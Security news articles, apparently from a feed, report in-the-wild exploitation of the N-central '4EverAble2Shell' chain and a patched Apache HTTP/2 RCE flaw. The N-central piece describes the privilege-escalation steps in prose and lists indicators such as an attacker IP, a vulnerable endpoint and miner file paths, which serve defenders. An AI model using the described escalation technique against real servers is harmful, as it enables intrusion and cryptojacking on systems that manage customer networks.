"The miner is the only payload we have seen, but the escalation hands the operator root on a host that manages your customers' endpoints," Huntback said. "Treat a hit as a full compromise, not a cleanup job. Applying Hotfix 2 is not enough on its own: 19 of the victims here were already running it."

Vulnerabilities & Patching.title: New N-able "4EverAble2Shell" zero-day exploited hours after PoC released
Vulnerabilities & Patching.context: Hackers are actively exploiting a newly disclosed N-able N-central zero-day vulnerability dubbed "4EverAble2Shell" to compromise servers and deploy cryptocurrency miners, with...
Vulnerabilities & Patching.full_text:
Hackers are actively exploiting a newly disclosed N-able N-central zero-day vulnerability dubbed "4EverAble2Shell" to compromise servers and deploy cryptocurrency miners, with researchers reporting at least 21 affected systems, including 19 running the company's latest security update.

The attacks follow security researcher Sean Bales' release of two new zero-day exploits today, dubbed 4EverAble2Shell and Agent2Shell, which he says allow attackers to gain root-level access to N-central appliances and SYSTEM-level access to Windows systems.

N-central is a remote monitoring and management (RMM) platform used by managed service providers (MSPs) and IT teams to monitor, manage, and secure customer devices and networks remotely.

The new vulnerabilities were disclosed on November 12, just two days after N-able released emergency security updates to address critical N-central zero-day vulnerabilities that Bales had publicly disclosed earlier this week.

Bales published proof-of-concept exploits for both the 4EverAble2Shell and Agent2Shell vulnerabilities, saying they were tested against N-central Appliance 2026.4.1.26 HF2, the security update N-able released on November 10.

The 4EverAble2Shell exploit allows unauthenticated attackers to execute commands as root on vulnerable N-central servers. However, the researcher says exploitation requires the platform's Legacy API functionality to be enabled.

The attack combines an Apache Axis vulnerability, tracked as CVE-2026-90436, with a separate N-central privilege escalation weakness to gain root-level access.

The second exploit, Agent2Shell, targets N-central's agent functionality and is claimed to allow attackers to execute commands with SYSTEM privileges on Windows devices.

The disclosures came after N-able took its hosted N-central environments offline earlier this week and urged on-premises customers to shut down their servers after Bales published more than 30 alleged zero-day vulnerabilities.

Bales has criticized N-able's handling of the vulnerability disclosures and the company's slow response to patching responsibly disclosed flaws.

"It's much much easier for me to just release the research I have and the vendor can decide what they want to do with it, what they do and don't want to fix, etc. :)," Bales told BleepingComputer.

Bales said N-able has not patched two unrelated RCE vulnerabilities in a different N-able product that he previously disclosed to the company in July.

In a November 12 security advisory, N-able said it was implementing additional protections in response to the new disclosures, including restricting certain N-central features and integrations while it develops further fixes.

"We are restricting certain N-central features and integrations," N-able said.

"These measures may affect some functionality, but we believe taking additional precautions while remediation is completed is the right action to protect our partners and their customers."

The company says it has disabled the Intune integration as a precaution and is urging on-premises customers to ensure Legacy API access is disabled, which is already the default.

The protections have already been applied to hosted environments, but customers are also advised to continue upgrading their Agents and Probes under the previous Hotfix 2 guidance.

In its advisory, N-able said it had seen no signs of compromise using the new flaws, although security researchers have since reported successful exploitation of the vulnerability against production N-central servers.

Hackers already exploiting 4EverAble2Shell

Cybersecurity company Previdian told BleepingComputer that attackers began probing for the 4EverAble2Shell vulnerability on November 12, shortly after the public release of the proof-of-concept exploit.

The company first observed suspicious requests targeting its N-central honeypot at approximately 08:30 UTC, using the same Java class referenced in the publicly released exploit.

While the initial requests were limited to probing for vulnerable servers, Previdian later confirmed that attackers were attempting to execute the complete exploit chain against its honeypot server.

The attacks initially exploit Apache Axis CVE-2026-90436 to execute commands as the 'nable' service account, then exploit a separate N-central privilege escalation vulnerability to obtain root privileges.

This attack chain matches the POC Bales released on GitHub.

According to Previdian, the privilege escalation stage abuses N-central's privileged setLDFileOwner helper and a symbolic link to make a normally root-owned script writable.

The attacker then modifies the script and invokes N-central's serverControl functionality to execute commands as root, while attempting to restore the modified files afterward.

The payload attempted to download and execute an additional shell script from an attacker-controlled server at 157.20.241[.]16, while sending diagnostic information and command output back to the same IP address.

Previdian is tracking the N-central privilege escalation flaw as VULN-2026-0009 and has added it to its own Known Exploited Vulnerabilities (KEV) catalog.

Cybersecurity company Huntback also reports that attackers have already successfully compromised at least 21 production N-central servers using Bales' publicly released exploit chain.

Huntback saw the same attacker IP address as Previdian probing its N-central honeypots at approximately 08:30 UTC on November 12, with the first attempts to execute the complete exploit chain beginning at 09:16 UTC.

The attacks seen by Huntback exploited the 4EverAble2Shell exploit chain to download a shell script that installed an XMRig Monero cryptocurrency miner.

The miner was configured to use about half of the available CPU cores, likely to make the mining harder to detect.

Huntback identified other compromised systems through the attacker's cryptocurrency mining pool statistics, where infected systems were assigned identifiers beginning with nc_ followed by the server's IP address.

At 12:50 UTC on November 12, the researchers found 21 active miners using this naming convention, all of which had submitted mining shares within the previous five minutes.

The researchers then checked the associated IP addresses and confirmed that all 21 hosted N-central installations, including 19 running version 2026.4.1.26, the latest Hotfix 2 release issued on November 10.

The compromised servers were located across multiple countries, including the United States, Canada, South Africa, the United Kingdom, Germany, France, and Sweden.

While the attacks observed so far have been primarily used for cryptojacking, attackers could use compromised N-central infrastructure for additional malicious activity targeting managed customer environments.

Organizations running N-central should ensure that Legacy APIs are disabled and investigate suspicious requests to /dms/services/ServerUI, especially those referencing jline.internal.TerminalLineSettings.

Huntback also recommends checking for unexpected xvd.service systemd services, cryptocurrency mining processes, and files created under /tmp/.xvd or /var/tmp/.xvd.

Because the 4EverAble2Shell attack grants full root access to exploited servers, organizations that detect these IOCs should treat the breach as a full compromise of the server.

Vulnerabilities & Patching.title: Apache HTTP Server patches critical HTTP/2 remote code execution flaw
Vulnerabilities & Patching.context: A critical vulnerability in the HTTP/2 module of Apache HTTP Server could be exploited by an unauthenticated attacker to obtain remote code execution (RCE)
Vulnerabilities & Patching.full_text:
A critical vulnerability in the HTTP/2 module of Apache HTTP Server could be exploited by an unauthenticated attacker to obtain remote code execution (RCE).

The Apache Software Foundation has fixed the issue, now tracked as CVE-2026-119618, but a significant number of servers are vulnerable and reachable over the public internet.

Discovered by Anthropic’s OSS Scanner and Google Cloud’s Vulnerability Research teams, the vulnerability is a race condition in the mod_http2 module that can corrupt heap memory.

An attacker successfully exploiting it could run code with the web server process’s privileges in HTTP Server versions 2.4.55 through 2.4.70, and standalone mod_h2 version 2.0.8 through 2.0.42.

Apache describes the problem as “Concurrent Execution using Shared Resource with Improper Synchronization vulnerability in Apache HTTP Server's mod_http2 in assign_headers() can lead to RCE.”

Apache HTTP Server is a free and open-source software that handles requests from web browsers and serves pages, images, and other website content. It is a widely used tool estimated to back roughly one out of five websites.

According to telemetry data from cloud security company Wiz, 64% of the cloud environments have vulnerable resources, and roughly half of them have publicly exposed instances.

However, the numbers do not account for server configuration, which requires HTTP/2 to be enabled (default is off).

Researchers at cybersecurity company watchTowr confirmed this condition and recommend technicians to "patch now or drop h2 until you can."

"Due to improper synchronization when executing concurrent threads sharing resources, an attacker can trigger heap corruption," Wiz researchers say.

"This memory corruption can ultimately be leveraged to achieve RCE on the hosting server, allowing unauthorized threat actors to execute arbitrary commands with the privileges of the web server process."

Wiz assesses the severity of the vulnerability to be critical, although no official score is available. The company says that it is currently unaware of any public exploits or attacks targeting the flaw, but this could change soon.

The latest version of Apache HTTP Server also addresses two additional flaws, CVE-2026-106023 - a null pointer dereference in ‘mod_md,’ and CVE-2026-109163 - a low-severity data overwrite flaw in ‘mod_vhost_alias.’
